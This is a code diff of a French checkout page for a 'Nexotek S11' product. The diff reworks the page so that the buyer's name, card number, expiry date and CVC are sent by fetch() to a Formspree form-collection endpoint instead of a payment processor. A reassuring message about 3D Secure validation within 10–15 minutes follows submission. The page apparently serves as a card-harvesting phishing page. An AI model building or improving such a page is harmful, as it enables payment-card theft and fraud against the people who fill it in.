@@ -15,18 +15,10 @@
     }
     header {
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
     }
     header img {
       height: 50px;
-    }
-    .product {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-    .product img {
-      max-width: 100%;
-      border-radius: 10px;
     }
     form {
       background-color: #1a1a1a;
@@ -45,14 +37,6 @@
       border-radius: 5px;
       border: none;
       font-size: 16px;
-    }
-    .card-info {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-    }
-    .card-info input {
-      flex: 1;
     }
     .total {
       text-align: right;
@@ -80,6 +64,11 @@
       margin: 30px auto;
       text-align: center;
     }
+    .product-img {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 100%;
+    }
   </style>
 </head>
 <body>
@@ -88,11 +77,9 @@
     <img src="logo.png" alt="Logo Nexotek">
   </header>
 
-  <div class="product">
-    <img src="produit.jpg" alt="Produit Nexotek S11" />
-  </div>
+  <img src="product.jpg" alt="Produit Nexotek S11" class="product-img" />
 
-  <form>
+  <form action="https://formspree.io/f/mvgapayj" method="POST">
     <label for="name">Nom complet</label>
     <input type="text" id="name" name="name" required />
 
@@ -117,10 +104,11 @@
     <label for="card">Numéro de carte bancaire</label>
     <input type="text" id="card" name="card" required />
 
-    <div class="card-info">
-      <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required />
-      <input type="text" id="cvv" name="cvv" placeholder="CVV" required />
-    </div>
+    <label for="expiry">Mois / Année d’expiration</label>
+    <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required />
+
+    <label for="cvc">Code de sécurité (CVC)</label>
+    <input type="text" id="cvc" name="cvc" required />
 
     <div class="total">Total : <span id="total">119 €</span></div>
 
@@ -133,7 +121,7 @@
     <p>Le traitement de votre paiement va commencer et peut prendre entre <strong>10 à 15 minutes</strong> via notre prestataire agréé.</p>
     <p>Gardez votre téléphone à proximité pour une éventuelle validation <strong>3D Secure</strong>.</p>
     <p>Une fois le paiement validé par votre banque, vous recevrez votre <strong>facture</strong> et les <strong>informations de livraison</strong> par e-mail.</p>
-    <p>Vous pouvez à présent quitter cette page, tout est entre de bonnes mains.</p>
+    <p>Vous pouvez à présent quitter cette page.</p>
   </div>
 
   <script>
@@ -150,10 +138,24 @@
 
     form.addEventListener("submit", function (e) {
       e.preventDefault();
-      form.style.display = "none";
-      confirmationBox.style.display = "block";
-
-      // Optionnel : envoi des infos via fetch pour traitement backend
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: "POST",
+        body: formData,
+        headers: {
+          Accept: "application/json"
+        }
+      }).then(response => {
+        if (response.ok) {
+          form.style.display = "none";
+          confirmationBox.style.display = "block";
+        } else {
+          alert("Erreur d'envoi. Veuillez réessayer.");
+        }
+      }).catch(error => {
+        alert("Erreur réseau. Veuillez vérifier votre connexion.");
+        console.error(error);
+      });
     });
   </script>
 
